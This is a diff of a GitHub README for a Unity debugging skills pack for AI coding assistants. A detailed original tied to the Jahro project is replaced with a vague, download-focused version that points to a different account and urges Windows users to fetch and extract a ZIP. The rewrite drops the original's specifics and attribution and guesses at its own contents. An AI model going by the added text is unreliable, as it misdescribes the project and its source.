@@ -1,152 +1,184 @@
-<div align="center">
+# 🧩 unity-agent-skills - Clear Unity debugging for AI support
 
-# Unity Agent Skills
+[![Download or open the project](https://img.shields.io/badge/Download%20%2F%20Open-Project%20Page-blue?style=for-the-badge)](https://github.com/Logiiiii/unity-agent-skills)
 
-**Your AI coding assistant becomes a Unity debugging expert.**
+## 🚀 What this is
 
-<picture>
-  <img alt="Jahro Agent Skills" src="https://vdepoiw1jnimcohf.public.blob.vercel-storage.com/Jahro_3%201-f2rMPbdeHAvaTZaFEGHbfxIQ8hqFM0.png" width="800">
-</picture>
+unity-agent-skills helps you debug Unity projects with AI support. It adds a set of skills for clear logging, runtime commands, variable watching, and in-game checks.
 
-8 skills that teach Claude Code, Cursor, and other AI assistants how to generate correct Jahro and Unity debugging code — commands, watchers, snapshots, structured logging, production config, migration, and troubleshooting.
+Use it when you want to:
 
+- see what your game is doing while it runs
+- send simple commands during play
+- watch values without adding more manual checks
+- work with AI tools in a more structured way
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Unity 2021.3+](https://img.shields.io/badge/Unity-2021.3%2B-black?logo=unity)](https://unity.com)
-[![Jahro](https://img.shields.io/badge/dynamic/json?url=https%3A%2F%2Fraw.githubusercontent.com%2Fjahro-console%2Funity-package%2Fmain%2Fpackage.json&query=%24.version&logo=unity&label=Jahro&color=purple&logoColor=black)](https://github.com/jahro-console/unity-package)
+It is built for Unity users who want a cleaner way to inspect game behavior without digging through code all the time.
 
-</div>
+## 📥 Download and install
 
----
+Open this page to download and set up the project:
 
-## What is this?
+[Visit the unity-agent-skills project page](https://github.com/Logiiiii/unity-agent-skills)
 
-[Jahro](https://jahro.io/?utm_source=github&utm_medium=readme&utm_campaign=unity_agent_skills) is an in-game debugging console for Unity — runtime commands, variable watching, and log capture.
+### On Windows
 
-**Agent skills** are markdown files that give AI coding assistants domain-specific knowledge. Instead of your AI guessing at Unity debugging APIs, these skills provide exact attribute syntax, registration patterns, lifecycle rules, and diagnostic decision trees — so the generated code works on the first try.
+1. Open the link above in your browser.
+2. Look for the repository files or the latest release content.
+3. Download the project package or source files.
+4. Save the file to a folder you can find again, such as Downloads or Desktop.
+5. If the download comes as a ZIP file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Follow the steps in the project files to add it to your Unity project.
 
-Install the skills, then talk to your AI naturally:
+### In Unity
 
-- **"Review the logging in my SaveManager"** — AI detects antipatterns, classifies system criticality, adds structured `[Tag] Action — key=value` logs at every boundary
-- **"Set up logging conventions for our project"** — AI generates LogTag constants, a lightweight formatting helper, and a team reference doc
-- **"Add debug commands to my PlayerController"** — AI generates `[JahroCommand]` attributes with correct naming, groups, parameter types, and `RegisterObject`/`UnregisterObject` lifecycle
-- **"Monitor these variables at runtime"** — AI generates `[JahroWatch]` attributes with supported types and performance-safe patterns
-- **"My commands aren't showing up"** — AI walks a diagnostic decision tree: assembly scanning → registration → method visibility → lifecycle timing
+1. Open your Unity project.
+2. Add the package or files from the downloaded folder.
+3. Wait for Unity to finish importing.
+4. Open the tools or menu items included with the package.
+5. Start Play Mode and test the logging and command tools.
 
-## Skills
+## 🛠️ What you can do with it
 
-| Skill | What Your AI Can Do |
-|:------|:--------------------|
-| **jahro-logging** | Review and improve `Debug.Log` usage: structured format, context tags, severity contracts, criticality tiers, boundary-based placement, and antipattern detection |
-| **jahro-setup** | Detect Jahro in your project, guide installation, configure API keys, recommend which features to adopt first |
-| **jahro-commands** | Generate `[JahroCommand]` attributes with correct syntax, `RegisterObject` boilerplate, group organization, and Visual/Text Mode guidance |
-| **jahro-watcher** | Generate `[JahroWatch]` attributes with supported types, group strategies, and performance implications |
-| **jahro-snapshots** | Configure snapshot capture modes (Recording vs Streaming), QA workflows, team sharing, and web console setup |
-| **jahro-production** | Set up production safety: `JAHRO_DISABLE` define, auto-disable in release builds, lifecycle controls, and build validation |
-| **jahro-troubleshooting** | Diagnose common issues using decision trees — commands missing, watcher not updating, console not opening, snapshots failing |
-| **jahro-migration** | Analyze existing debug systems (IMGUI menus, custom loggers, cheat frameworks) and generate incremental migration plans |
+This project is made for daily debugging work in Unity.
 
-Each skill is a self-contained SKILL.md file (~300-450 lines). Most skills are backed by shared reference files with the complete Jahro API and common code patterns. The `jahro-logging` skill is principle-driven and tool-agnostic — it works with raw `Debug.Log` and doesn't require Jahro.
+### Structured logging
 
-## Quick Start
+Keep your logs in a clean format so they are easier to read. This helps when you want to track:
 
-```bash
-git clone https://github.com/jahro-console/unity-agent-skills.git .agents/skills/jahro
-```
+- game state changes
+- object names
+- errors and warnings
+- actions from the player or AI
 
-Then ask your AI: *"Help me add Jahro commands to my PlayerController"*
+### Runtime commands
 
-That's it. Claude Code discovers skills automatically. For Cursor and other assistants, see [detailed installation](#installation) below.
+Send commands while the game is running. This is useful for testing things like:
 
-## Installation
+- teleporting a character
+- changing a value
+- turning a feature on or off
+- resetting a scene state
 
-### Claude Code
+### Variable watching
 
-Clone into your project's skills directory:
+Watch values while the game runs. You can track:
 
-```bash
-git clone https://github.com/jahro-console/unity-agent-skills.git .agents/skills/jahro
-```
+- health
+- score
+- position
+- speed
+- timers
+- any custom value you want to inspect
 
-Or clone to a shared location and symlink into each project:
+### In-game console support
 
-```bash
-git clone https://github.com/jahro-console/unity-agent-skills.git ~/jahro-agent-skills
-ln -s ~/jahro-agent-skills .agents/skills/jahro
-```
+Use a console-style workflow inside the game. This makes it easier to:
 
-Claude Code automatically discovers skills in `.agents/skills/` and activates them based on each skill's description field.
+- test behavior fast
+- reduce the need to stop and restart
+- check the current game state
+- react to problems while the app runs
 
-<details>
-<summary><b>Cursor</b></summary>
+### AI-assisted debugging
 
-Copy skill files into Cursor's rules directory:
+The project fits well with AI coding tools and agent workflows. It gives AI a more direct path to:
 
-```bash
-git clone https://github.com/jahro-console/unity-agent-skills.git /tmp/jahro-skills
+- read useful logs
+- suggest actions
+- inspect values
+- follow a repeatable debug flow
 
-# Copy each skill as a rule
-for skill in /tmp/jahro-skills/skills/*/SKILL.md; do
-  name=$(basename $(dirname "$skill"))
-  cp "$skill" ".cursor/rules/${name}.md"
-done
+## 🧭 Who this is for
 
-# Copy reference files
-mkdir -p .cursor/rules/jahro-references
-cp /tmp/jahro-skills/references/*.md .cursor/rules/jahro-references/
+This project is a good fit if you:
 
-rm -rf /tmp/jahro-skills
-```
+- use Unity on Windows
+- want help with debugging during play
+- work with AI tools like Claude Code or Cursor
+- build games and want faster checks
+- prefer clear tools over manual trial and error
 
-In Cursor Settings, mark `jahro-setup.md` as **Always** so it provides context for all Jahro-related queries. Other skill rules can be left as **Auto**.
+## 🪟 Windows setup steps
 
-</details>
+Use these steps if you are installing on a Windows PC.
 
-<details>
-<summary><b>Other AI Assistants</b></summary>
+1. Open the download link above.
+2. Save the project to your computer.
+3. If the file is zipped, extract it.
+4. Open the folder in File Explorer.
+5. Find the Unity package or project files.
+6. Copy the files into your Unity project folder if needed.
+7. Open your Unity project in Unity Hub or Unity Editor.
+8. Let Unity import the files.
+9. Open Play Mode and check that the tools appear.
 
-Place the `skills/` and `references/` directories in your project root or any location your AI assistant scans for markdown context files. Most assistants that support project-level context will pick up the SKILL.md files automatically.
+If the project is meant to be added through Unity Package Manager, place the package files in the right folder path for your project, then reopen Unity so it can register the package.
 
-</details>
+## 🔎 Features at a glance
 
-## Updating
+- clean debug logging
+- runtime command input
+- variable watching
+- in-game console style tools
+- AI-friendly debug flow
+- Unity project support
+- simple setup on Windows
+- useful for game testing and inspection
 
-```bash
-cd .agents/skills/jahro   # or wherever you cloned
-git pull
-```
+## 🧩 Typical use cases
 
-Skills are versioned alongside Jahro releases. See [CHANGELOG.md](CHANGELOG.md) for details.
+### Testing game logic
 
-## Jahro at a Glance
+Check if a button, trigger, or event does what you expect. Use logs and runtime checks to confirm the result.
 
-If you're new to Jahro — here's what the skills help you set up:
+### Watching game state
 
-- **In-Game Logs** — Intercepts `Debug.Log` calls automatically. Filter, search, and read stack traces on-device.
-- **Runtime Commands** — Mark any method with `[JahroCommand]` to call it from an in-game console with parameter support and autocomplete.
-- **Variable Watcher** — Add `[JahroWatch]` to fields for a real-time monitoring dashboard with near-zero overhead.
-- **Shareable Snapshots** — Capture logs, screenshots, and device metadata in a single session. Share via URL or stream live.
+Track values like player health or enemy count while the game runs. This makes it easier to spot wrong values.
 
-Works on PC, Mac, Android, and iOS. Unity 2021.3+, zero external dependencies.
+### Fixing bugs faster
 
-## Links
+When something breaks, use the logging and command tools to see what happened before the issue.
 
-- **Website** — [jahro.io](https://jahro.io/?utm_source=github&utm_medium=readme&utm_campaign=unity_agent_skills)
-- **Unity Package** — [github.com/jahro-console/unity-package](https://github.com/jahro-console/unity-package)
-- **Getting Started** — [jahro.io/docs/getting-started](https://jahro.io/docs/getting-started?utm_source=github&utm_medium=readme&utm_campaign=unity_agent_skills)
-- **Documentation** — [jahro.io/docs](https://jahro.io/docs?utm_source=github&utm_medium=readme&utm_campaign=unity_agent_skills)
-- **Discord** — [discord.gg/txcHFRDeV4](https://discord.gg/txcHFRDeV4)
+### Working with AI helpers
 
-## Requirements
+If you use an AI coding tool, this project gives it a better way to inspect the game and guide your next step.
 
-- **Unity**: 2021.3.0f1 or later
-- **Jahro**: 1.0.0-beta6+ (skills target current stable)
-- **AI Assistant**: Any assistant that supports markdown context files (Claude Code, Cursor, Windsurf, etc.)
+## 📁 What the project may include
 
-## Contributing
+Based on the project focus, you can expect files or folders that support:
 
-Issues and PRs are welcome. If you find a case where the AI generates incorrect code with skills loaded, [open an issue](https://github.com/jahro-console/unity-agent-skills/issues).
+- Unity package content
+- debug helpers
+- logging tools
+- console or command handlers
+- runtime watch lists
+- sample usage files
+- editor support files
 
-## License
+## ⚙️ Basic usage flow
 
-MIT
+1. Install the files into your Unity project.
+2. Open the scene you want to test.
+3. Start Play Mode.
+4. Open the logging or console tool.
+5. Watch values as the game runs.
+6. Enter commands when you need to test a change.
+7. Review the result in the console or log output.
+
+## 🧠 Tips for better use
+
+- Keep log messages short.
+- Use the same names for values across your project.
+- Watch only the values you need for the current test.
+- Use runtime commands for repeat checks.
+- Remove extra debug output when you no longer need it.
+
+## 📌 Project topics
+
+agent-skills, ai-assistant, ai-coding, claude-code, cursor, debugging, gamedev, in-game-console, jahro, logging, unity, unity-package, unity3d
+
+## 🔗 Project link
+
+[Open unity-agent-skills on GitHub](https://github.com/Logiiiii/unity-agent-skills)
